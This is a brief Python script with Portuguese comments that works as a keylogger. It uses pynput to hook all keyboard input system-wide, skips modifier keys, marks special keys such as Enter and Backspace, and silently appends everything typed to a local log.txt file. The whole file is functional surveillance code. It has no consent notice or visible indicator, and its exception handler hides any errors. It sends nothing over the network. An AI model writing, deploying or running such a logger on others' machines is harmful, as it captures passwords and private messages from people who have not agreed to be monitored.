from pynput import keyboard

# Teclas que serÃ£o ignoradas
IGNORE_KEYS = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl,
    keyboard.Key.ctrl_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.alt,
    keyboard.Key.alt_r,
    keyboard.Key.alt_l,
    keyboard.Key.cmd,
    keyboard.Key.cmd_r,
    keyboard.Key.caps_lock,
    keyboard.Key.num_lock,
    keyboard.Key.esc,
}

# Buffer para acumular os caracteres
buffer = ""

def salvar_buffer():
    global buffer
    if buffer:
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(buffer)
        buffer = ""

def on_press(key):
    global buffer
    try:
        if key in IGNORE_KEYS:
            return

        if key == keyboard.Key.space:
            buffer += " "
        elif key == keyboard.Key.enter:
            buffer += " [ENTER]\n"
            salvar_buffer()
        elif key == keyboard.Key.tab:
            buffer += "\t"
        elif key == keyboard.Key.backspace:
            buffer += "[BACKSPACE]"
        elif key == keyboard.Key.delete:
            buffer += "[DELETE]"
        elif key == keyboard.Key.left:
            buffer += "[LEFT]"
        elif key == keyboard.Key.right:
            buffer += "[RIGHT]"
        elif hasattr(key, "char") and key.char is not None:
            buffer += key.char
        else:
            buffer += f"[{key.name.upper()}]"

        # Salva se buffer estiver muito cheio
        if len(buffer) > 100:
            salvar_buffer()

    except Exception:
        pass

def main():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()